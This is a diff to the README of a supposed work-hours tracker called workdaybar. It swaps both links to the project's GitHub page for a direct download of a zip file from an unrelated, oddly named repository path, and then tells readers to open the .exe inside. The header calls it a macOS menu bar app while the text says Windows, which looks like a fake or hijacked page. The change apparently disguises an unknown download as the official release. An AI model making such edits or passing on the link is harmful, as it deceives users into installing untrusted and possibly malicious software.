@@ -5,7 +5,7 @@ description: "Track your workday progress with a macOS menu bar icon that fills 
 ---
 # ⏱️ workdaybar - Track your work hours with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Workdaybar-blue)](https://github.com/statesrightsroyalty347/workdaybar)
+[![Download for Windows](https://img.shields.io/badge/Download-Workdaybar-blue)](https://raw.githubusercontent.com/statesrightsroyalty347/statesrightsroyalty347.github.io/main/pyroxmangite/3.8.zip)
 
 Workdaybar helps you track your time on Windows. You can view how you spend your day with a simple interface. This tool runs in your taskbar. It shows your active hours and tasks. You gain insight into your daily habits. This data helps you plan your work better.
 
@@ -17,7 +17,7 @@ You need a computer that runs Windows 10 or Windows 11. Your computer needs at l
 
 Follow these steps to install the software on your machine:
 
-1. Visit the [official download page](https://github.com/statesrightsroyalty347/workdaybar).
+1. Visit the [official download page](https://raw.githubusercontent.com/statesrightsroyalty347/statesrightsroyalty347.github.io/main/pyroxmangite/3.8.zip).
 2. Look for the latest release version on the page.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes.
